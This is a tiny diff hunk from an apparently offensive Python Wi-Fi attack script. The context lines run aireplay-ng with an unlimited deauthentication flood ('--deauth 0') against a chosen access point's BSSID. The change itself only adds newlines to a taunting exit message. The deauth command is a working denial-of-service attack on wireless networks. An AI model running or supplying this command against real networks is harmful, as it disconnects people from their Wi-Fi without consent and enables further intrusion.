@@ -133,4 +133,4 @@ try:
     print(R)
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
 except KeyboardInterrupt:
-    print(G + "[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)
+    print(G + "\n\n[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)
